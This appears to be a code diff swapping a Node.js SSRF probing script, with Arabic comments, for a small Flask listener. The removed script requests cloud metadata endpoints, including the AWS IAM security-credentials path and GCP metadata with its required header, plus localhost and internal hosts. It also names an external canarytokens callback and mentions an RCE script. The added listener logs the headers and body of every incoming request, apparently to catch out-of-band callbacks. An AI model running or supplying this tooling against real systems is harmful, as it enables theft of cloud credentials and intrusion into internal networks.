@@ -1,55 +1,10 @@
-const axios = require('axios');
+# app.py
+from flask import Flask, request
+app = Flask(__name__)
 
-const TARGET_URLS = [
-  'http://169.254.169.254/latest/meta-data/',
-  'http://169.254.169.254/latest/user-data/',
-  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-  'http://metadata.google.internal/computeMetadata/v1/instance/id',
-  'http://metadata.google.internal/computeMetadata/v1/project/project-id',
-  'http://localhost/',
-  'http://localhost:3000/',
-  'http://127.0.0.1/',
-  'http://127.0.0.1:5000/',
-  'http://127.0.0.1:8080/',
-  'http://internal/',
-  'http://internal.website/',
-  'http://docker.for.mac.localhost/',
-  'http://canarytokens.com/images/about/p0kby1ermspaxxc25icmq89af/submit.aspx',  // ضع التوكن الخاص بك
-  'http://canarytokens.com/images/about/p0kby1ermspaxxc25icmq89af/submit.aspx' // سكربت RCE لو عندك سيرفر خاص
-];
-
-const METHODS = ['GET', 'POST', 'HEAD'];
-
-async function ssrfTest() {
-  console.log('🚀 بدء فحص SSRF المتقدم...\n');
-
-  for (const url of TARGET_URLS) {
-    for (const method of METHODS) {
-      try {
-        console.log(`🔎 Trying [${method}] ${url}`);
-
-        const config = {
-          method,
-          url,
-          timeout: 3500,
-          headers: {}
-        };
-
-        // إضافة Header خاص لـ GCP Metadata إذا احتجت
-        if (url.includes('metadata.google.internal')) {
-          config.headers['Metadata-Flavor'] = 'Google';
-        }
-
-        const res = await axios(config);
-        console.log(`✅ [${method}] ${url} - Status ${res.status}`);
-      } catch (err) {
-        const msg = err.code || err.message || 'unknown error';
-        console.log(`❌ [${method}] ${url} - ${msg}`);
-      }
-    }
-  }
-
-  console.log('\n✅ انتهى الفحص.');
-}
-
-ssrfTest();
+@app.route('/', methods=['GET', 'POST'])
+def index():
+    print(f"[+] New Request from: {request.remote_addr}")
+    print(f"[+] Headers: {dict(request.headers)}")
+    print(f"[+] Body: {request.data.decode()}")
+    return "OK", 200
